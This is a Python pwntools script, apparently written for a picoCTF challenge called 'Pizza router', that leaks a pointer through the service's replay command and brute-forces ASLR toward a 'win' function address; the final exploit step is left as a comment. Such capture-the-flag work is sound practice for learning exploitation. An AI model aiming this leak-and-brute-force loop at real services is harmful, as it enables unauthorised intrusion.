#!/usr/bin/env python3
"""Pizza router - quick ASLR brute force. Try connections until win_high < 192."""
from pwn import *
import sys, io, re, time
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
context.log_level = "error"

HOST = "mysterious-sea.picoctf.net"
PORT = 64586
G = 16

def attempt():
    r = remote(HOST, PORT, timeout=5)
    r.recv(timeout=2)
    r.sendline(b"load city1.map"); time.sleep(0.3); r.recv(timeout=1)
    r.sendline(b"add_order 5 5"); time.sleep(1); r.recv(timeout=1)
    r.sendline(b"replay 0"); time.sleep(0.5)
    rep = r.recv(timeout=2).decode(errors="replace")
    try: rep += r.recv(timeout=1).decode(errors="replace")
    except: pass
    r.close()
    m = re.search(r"renderer=(0x[0-9a-f]+)", rep)
    if not m: return None
    renderer = int(m.group(1), 16)
    win = renderer + 0x200
    return (win & 0xFFFFFFFF, (win >> 32) & 0xFFFFFFFF, win)

# Scan for a PIE base where win_high < 192
for i in range(500):
    try:
        result = attempt()
    except Exception as e:
        time.sleep(0.5)
        continue
    if result is None:
        continue
    win_low, win_high, win = result
    if win_high < 192:
        print(f"[LUCK] Attempt {i+1}: win_high={hex(win_high)}={win_high} win={hex(win)}")
        # Now run the full exploit
        sys.exit(0)
    if i % 20 == 0:
        print(f"Attempt {i+1}: win_high={hex(win_high)}")
    time.sleep(0.2)

print("No luck after 500 attempts")
